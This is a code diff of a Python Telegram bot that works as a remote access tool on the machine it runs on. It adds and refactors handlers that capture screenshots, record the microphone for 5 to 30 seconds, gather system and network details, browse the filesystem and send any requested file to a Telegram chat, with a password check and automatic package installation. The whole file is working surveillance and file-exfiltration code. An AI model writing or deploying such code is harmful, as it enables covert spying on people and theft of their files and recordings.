@@ -1,19 +1,22 @@
+import asyncio
 import logging
 import os
 import sys
 import platform
 import sounddevice as sd
-from scipy.io.wavfile import write
+import numpy as np
+import wave
 import tempfile
 from PIL import ImageGrab
 import socket
 import netifaces
-import subprocess
 import pkg_resources
 import httpx
 from dotenv import load_dotenv
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
+import concurrent.futures
+
 
 # Verify all required packages
 required_packages = ['Pillow', 'httpx', 'sounddevice', 'scipy', 'netifaces']
@@ -33,6 +36,7 @@ def check_and_install_packages(packages):
 # Check and install any missing packages before the rest of your script runs
 check_and_install_packages(required_packages)
 
+
 # Setup logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -46,6 +50,9 @@ PASSY = os.getenv('PASSY')
 
 # Store connected clients and their authentication status
 clients = {}
+
+# ThreadPoolExecutor for CPU-bound tasks
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=3)
 
 # Decorator to require authentication
 def require_auth(func):
@@ -81,7 +88,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     /explore - Explore filesystem
     /getfile - Get a file
     """
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=commands_menu)
+    await update.message.reply_text(commands_menu)
 
 @require_auth
 async def manage_clients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -94,7 +101,11 @@ async def manage_clients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 @require_auth
 async def info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    system_info = f"""
+    system_info = await asyncio.to_thread(get_system_info)
+    await update.message.reply_text(system_info)
+
+def get_system_info():
+    return f"""
     System: {platform.system()}
     Username: {os.getlogin()}
     Node Name: {platform.node()}
@@ -104,49 +115,50 @@ async def info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     Processor: {platform.processor()}
     CPU Cores: {os.cpu_count()}
     """
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=system_info)
 
 @require_auth
 async def network(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    network_info = ""
     try:
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        async with httpx.AsyncClient() as client:
-            response = await client.get('https://api.ipify.org?format=json')
-            public_ip = response.json()['ip']
-        for interface in netifaces.interfaces():
-            if interface != 'lo':
-                addrs = netifaces.ifaddresses(interface)
-                if netifaces.AF_INET in addrs:
-                    for addr in addrs[netifaces.AF_INET]:
-                        network_info += f"Interface: {interface}\nIP: {addr['addr']}\nNetmask: {addr['netmask']}\n\n"
-        network_info = f"Hostname: {hostname}\nLocal IP: {ip_address}\nPublic IP: {public_ip}\n\n{network_info}"
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=network_info)
+        network_info = await asyncio.to_thread(get_network_info)
+        await update.message.reply_text(network_info)
     except Exception as e:
         logger.error(f"Error retrieving network information: {e}")
+        await update.message.reply_text("Error retrieving network information.")
+
+def get_network_info():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    
+    network_info = f"Hostname: {hostname}\nLocal IP: {ip_address}\n\n"
+    
+    for interface in netifaces.interfaces():
+        if interface != 'lo':
+            addrs = netifaces.ifaddresses(interface)
+            if netifaces.AF_INET in addrs:
+                for addr in addrs[netifaces.AF_INET]:
+                    network_info += f"Interface: {interface}\nIP: {addr['addr']}\nNetmask: {addr['netmask']}\n\n"
+    
+    return network_info
 
 @require_auth
 async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    screenshot_path = 'screenshot.png'
     try:
-        screenshot = ImageGrab.grab()
-        screenshot.save(screenshot_path)
-        with open(screenshot_path, 'rb') as photo:
-            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
-        os.remove(screenshot_path)
+        screenshot = await asyncio.to_thread(ImageGrab.grab)
+        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
+            screenshot.save(temp_file.name)
+            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(temp_file.name, 'rb'))
+        os.unlink(temp_file.name)
     except Exception as e:
         logger.error(f"Error taking or sending screenshot: {e}")
-    finally:
-        if os.path.exists(screenshot_path):
-            try:
-                os.remove(screenshot_path)
-            except Exception as e:
-                logger.error(f"Error deleting screenshot: {e}")
+        await update.message.reply_text("Error taking or sending screenshot.")
 
 @require_auth
 async def record(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    keyboard = [[InlineKeyboardButton("5 seconds", callback_data='5')]]
+    keyboard = [
+        [InlineKeyboardButton("5 seconds", callback_data='5')],
+        [InlineKeyboardButton("15 seconds", callback_data='15')],
+        [InlineKeyboardButton("30 seconds", callback_data='30')],
+    ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text('Choose recording duration:', reply_markup=reply_markup)
 
@@ -172,18 +184,40 @@ async def explore_filesystem(update: Update, context: ContextTypes.DEFAULT_TYPE)
 @require_auth
 async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not context.args:
-        await update.message.reply_text("Usage: /sendfile <file_path>")
+        await update.message.reply_text("Usage: /getfile <file_path>")
         return
     file_path = ' '.join(context.args)
     if not os.path.exists(file_path):
         await update.message.reply_text(f"File not found: {file_path}")
         return
     try:
-        with open(file_path, 'rb') as file:
-            await context.bot.send_document(chat_id=update.effective_chat.id, document=file)
+        await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))
     except Exception as e:
         logger.error(f"Error sending file: {e}")
         await update.message.reply_text(f"Error sending file: {str(e)}")
+
+async def record_audio(duration, fs=44100):
+    try:
+        logging.info(f"Recording for {duration} seconds...")
+        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='float32')
+        sd.wait()
+        
+        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
+            write_wave(temp_file.name, recording, fs)
+        return temp_file.name
+    except Exception as e:
+        logging.error(f"Error during audio recording: {e}")
+        return None
+
+def write_wave(filename, data, fs):
+    try:
+        with wave.open(filename, 'wb') as wf:
+            wf.setnchannels(2)
+            wf.setsampwidth(2)
+            wf.setframerate(fs)
+            wf.writeframes(np.int16(data * 32767).tobytes())
+    except Exception as e:
+        logging.error(f"Error writing wave file: {e}")
 
 # Utility functions
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -197,18 +231,35 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     elif query.data == "exit_client_selection":
         clients[user_id]['selected_client'] = None
         await query.edit_message_text("Exited client selection.")
-    elif query.data.isdigit():
-        duration = int(query.data)
-        await record_audio(update, context, duration)
+    elif query.data in ['5', '15', '30']:
+        await record_audio_handler(update, context, query.data)
 
-async def record_audio(update: Update, context: ContextTypes.DEFAULT_TYPE, duration: int) -> None:
-    fs = 44100
-    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
-    sd.wait()
-    output_file = tempfile.mktemp(prefix="audio_", suffix=".wav", dir=None) 
-    write(output_file, fs, myrecording)
-    await context.bot.send_audio(chat_id=update.effective_chat.id, audio=open(output_file, 'rb'))
-    os.remove(output_file)
+async def record_audio_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, duration: str) -> None:
+    chat_id = update.effective_chat.id
+    
+    try:
+        duration = int(duration)
+        await context.bot.send_message(chat_id=chat_id, text=f"Recording for {duration} seconds...")
+        
+        # Start recording
+        filename = await record_audio(duration=duration)
+        
+        if filename:
+            # Double-check the recording duration
+            with wave.open(filename, 'rb') as wf:
+                actual_duration = wf.getnframes() / wf.getframerate()
+            
+            if abs(actual_duration - duration) > 1:  # Allow 1 second tolerance
+                logger.warning(f"Recording duration mismatch. Expected: {duration}s, Actual: {actual_duration:.2f}s")
+                await context.bot.send_message(chat_id=chat_id, text=f"Warning: Actual recording duration ({actual_duration:.2f}s) differs from requested duration ({duration}s).")
+            
+            await context.bot.send_audio(chat_id=chat_id, audio=open(filename, 'rb'))
+            os.unlink(filename)
+        else:
+            await context.bot.send_message(chat_id=chat_id, text="Failed to create audio recording.")
+    except Exception as e:
+        logging.error(f"Error in record_audio_handler: {e}")
+        await context.bot.send_message(chat_id=chat_id, text="An error occurred during recording.")
 
 async def list_directory(update: Update, context: ContextTypes.DEFAULT_TYPE, path: str) -> None:
     try:
